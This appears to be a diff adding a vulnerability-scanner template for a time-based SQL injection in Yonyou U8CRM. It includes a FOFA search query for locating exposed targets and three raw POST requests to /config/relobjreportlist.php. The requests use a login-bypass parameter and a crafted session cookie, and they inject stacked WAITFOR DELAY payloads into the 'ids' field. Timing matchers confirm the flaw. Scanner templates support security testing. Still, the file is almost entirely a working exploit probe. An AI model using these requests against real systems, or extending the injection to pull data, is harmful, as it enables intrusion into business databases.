@@ -1,0 +1,46 @@
+id: U8CRM-relobjreportlist-ids-SQL
+
+info:
+  name: 用友U8CRM-SQL注入-relobjreportlist-ids
+  author: final
+  severity: high
+  metadata:
+    fofa-query: title="用友U8CRM"
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /config/relobjreportlist.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=bgsesstimeout-;
+
+        DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:3'--
+
+      - |
+        @timeout: 30s
+        POST /config/relobjreportlist.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=bgsesstimeout-;
+
+        DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:5'--
+
+      - |
+        @timeout: 30s
+        POST /config/relobjreportlist.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID=bgsesstimeout-;
+
+        DontCheckLogin=1&Action=CheckRelUser&typeID=1&objType=1&ids=1');WAITFOR DELAY '0:0:8'--
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3 && duration_1<=4"
+          - "duration_2>=5 && duration_2<=6"
+          - "duration_3>=8 && duration_3<=9"
